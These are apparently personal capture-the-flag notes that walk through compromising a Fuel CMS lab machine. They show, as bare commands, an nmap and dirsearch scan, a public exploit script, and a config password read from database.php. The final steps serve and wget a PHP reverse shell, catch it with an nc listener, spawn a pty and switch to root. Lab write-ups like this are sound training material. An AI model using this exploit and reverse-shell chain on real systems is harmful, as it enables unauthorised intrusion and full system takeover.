```bash
sudo nmap 0.0.0.0 -F
sudo nmap 0.0.0.0 -F -sV
```

![[Captura desde 2024-09-09 15-37-21.png]]

```bash
dirsearch -u http://0.0.0.0 --exclude-status=400,403
```

![[Captura desde 2024-09-22 11-32-32.png]]

![[Captura desde 2024-09-22 11-36-35.png]]

Exploit: [https://github.com/AssassinUKG/fuleCMS](https://github.com/AssassinUKG/fuleCMS)

```bash
python exploit.py 0.0.0.0:00
```

![[Captura desde 2024-08-30 14-45-30.png]]

```bash
cat fuel/application/config/database.php
```

![[Captura desde 2024-09-22 02-44-16.png]]

password: `mememe`

reverse shell change host and port

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

![[Captura desde 2024-09-22 13-06-56.png]]

```bash
python3 -m http.server 8000
```

![[Captura desde 2024-09-22 13-03-59.png]]

```bash
wget http://0.0.0.0:8000/reverse.php
```

![[Captura desde 2024-09-22 13-03-28.png]]

![[Captura desde 2024-09-22 13-04-45.png]]

```bash
rlwrap nc -lvpn 4444
```

![[Captura desde 2024-09-22 13-05-36.png]]

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![[Captura desde 2024-09-22 13-08-20.png]]

```bash
su root
```

![[Captura desde 2024-09-22 13-09-35.png]]

```bash
cat /root/root.txt
```

![[Captura desde 2024-09-22 13-10-09.png]]


